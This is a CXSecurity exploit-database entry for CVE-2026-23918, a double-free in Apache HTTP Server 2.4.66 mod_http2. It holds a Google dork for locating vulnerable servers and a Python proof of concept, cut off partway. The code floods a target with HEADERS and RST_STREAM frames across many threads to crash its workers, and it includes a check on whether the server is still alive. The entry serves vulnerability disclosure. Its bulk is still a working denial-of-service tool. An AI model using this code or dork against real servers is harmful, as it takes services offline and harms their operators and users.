---
title: Apache HTTP Server 2.4.66 mod_http2 Double-Free Denial of Service
url: https://cxsecurity.com/issue/WLB-2026050022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-27
fetch_date: 2026-05-28T06:01:04.712618
---

# Apache HTTP Server 2.4.66 mod_http2 Double-Free Denial of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache HTTP Server 2.4.66 mod\_http2 Double-Free Denial of Service** **2026.05.27**  Credit:  **[xeloxa](https://cxsecurity.com/author/xeloxa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-23918](https://cxsecurity.com/cveshow/CVE-2026-23918/ "Click to see CVE-2026-23918")**  CWE: **[CWE-415](https://cxsecurity.com/cwe/CWE-415 "Click to see CWE-415")**  **[**Dork:** intext:"Apache/2.4.66" "HTTP/2"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Apache HTTP Server 2.4.66 - 'mod\_http2' Double-Free Denial of Service
# Google Dork: intext:"Apache/2.4.66" "HTTP/2"
# Date: 2026-05-06
# Exploit Author: xeloxa (https://github.com/xeloxa/) <alisunbul@proton.me>
# Vendor Homepage: https://httpd.apache.org/
# Software Link: https://archive.apache.org/dist/httpd/httpd-2.4.66.tar.gz
# Version: 2.4.66
# Tested on: Debian / Ubuntu
# CVE : CVE-2026-23918
"""
CVE-2026-23918 - Apache mod\_http2 Double-Free PoC
Quick summary: This bug (CWE-415) hits Apache 2.4.66. It's a race condition
in the stream cleanup path. If you spam HEADERS and RST\_STREAM fast enough,
you can trigger a double-free and crash the worker.
Author: xeloxa (https://github.com/xeloxa/) <alisunbul@proton.me>
Found by: Bartlomiej Dmitruk & Stanislaw Strzalkowski
"""
import argparse
import json
import os
import signal
import socket
import ssl
import sys
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Tuple
# ---------------------------------------------------------------------------
# Dependency Check
# ---------------------------------------------------------------------------
try:
import h2.config
import h2.connection
import h2.events
HAS\_H2 = True
except ImportError:
HAS\_H2 = False
# ---------------------------------------------------------------------------
# ANSI Colors (for terminal output)
# ---------------------------------------------------------------------------
class Color:
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"
def c(text: str, color: str) -> str:
"""Wrap text in color if output is a terminal."""
if sys.stdout.isatty():
return f"{color}{text}{Color.RESET}"
return text
def print\_banner(title: str, color: str = Color.BOLD) -> None:
"""Print a consistent tool banner with author info."""
print(f"{'=' \* 60}")
print(c(title, color))
print(f"Author: xeloxa (https://github.com/xeloxa/)")
print(f"{'=' \* 60}")
# ---------------------------------------------------------------------------
# Data Structures
# ---------------------------------------------------------------------------
@dataclass
class ExploitStats:
"""Just a thread-safe counter for the stats."""
connections: int = 0
requests: int = 0
resets: int = 0
conn\_errors: int = 0
stream\_errors: int = 0
crashes: int = 0
lock: threading.Lock = field(default\_factory=threading.Lock)
def inc(self, attr: str, delta: int = 1) -> None:
with self.lock:
setattr(self, attr, getattr(self, attr) + delta)
def snapshot(self) -> Dict[str, int]:
with self.lock:
return {
"connections": self.connections,
"requests": self.requests,
"resets": self.resets,
"conn\_errors": self.conn\_errors,
"stream\_errors": self.stream\_errors,
"crashes": self.crashes,
}
# ---------------------------------------------------------------------------
# SSL / HTTP/2 Connection Helpers
# ---------------------------------------------------------------------------
def create\_ssl\_context(
alpn\_protocols: Optional[List[str]] = None,
) -> ssl.SSLContext:
"""Create an SSL context configured for HTTP/2 ALPN negotiation."""
ctx = ssl.create\_default\_context()
ctx.check\_hostname = False
ctx.verify\_mode = ssl.CERT\_NONE
if alpn\_protocols is None:
alpn\_protocols = ["h2"]
ctx.set\_alpn\_protocols(alpn\_protocols)
return ctx
def establish\_h2\_connection(
host: str,
port: int,
timeout: float = 5.0,
use\_ssl: bool = True,
) -> Tuple[Optional[socket.socket], Optional[h2.connection.H2Connection]]:
"""
Sets up an H2 connection.
Returns (socket, h2\_connection) or (None, None) if something breaks.
"""
try:
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.settimeout(timeout)
sock.connect((host, port))
if use\_ssl:
ctx = create\_ssl\_context()
sock = ctx.wrap\_socket(sock, server\_hostname=host)
config = h2.config.H2Configuration(client\_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate\_connection()
sock.sendall(conn.data\_to\_send())
# Receive server preface (SETTINGS frame)
data = sock.recv(8192)
if not data:
sock.close()
return None, None
conn.receive\_data(data)
sock.sendall(conn.data\_to\_send())
return sock, conn
except Exception:
try:
sock.close()
except Exception:
pass
return None, None
# ---------------------------------------------------------------------------
# Mode 1: DoS - Rapid RST Attack
# ---------------------------------------------------------------------------
class RapidRSTDoS:
"""
The "classic" Rapid-RST DoS.
We send a HEADERS frame and immediately follow up with an RST\_STREAM.
If the server hasn't registered the stream yet, it'll trigger two
different cleanup callbacks. Both try to free the same memory.
Boom - SIGSEGV.
"""
def \_\_init\_\_(
self,
target: str,
port: int,
workers: int = 100,
intensity: int = 7,
use\_ssl: bool = True,
timeout: float = 5.0,
verbose: bool = False,
json\_output: bool = False,
):
self.target = target
self.port = port
self.num\_workers = workers
self.intensity = max(1, min(10, intensity))
self.use\_ssl = use\_ssl
self.timeout = timeout
self.verbose = verbose
self.json\_output = json\_output
self.running = True
self.crashed = False
self.stats = ExploitStats()
self.start\_time: Optional[float] = None
def is\_server\_alive(self) -> bool:
"""Check if the target server is responsive via HTTP/2."""
sock, conn = establish\_h2\_connection(
self.target, self.port, timeout=3.0, use\_ssl=self.use\_ssl
)
if sock is None:
return False
try:
sock.close()
except Exception:
pass...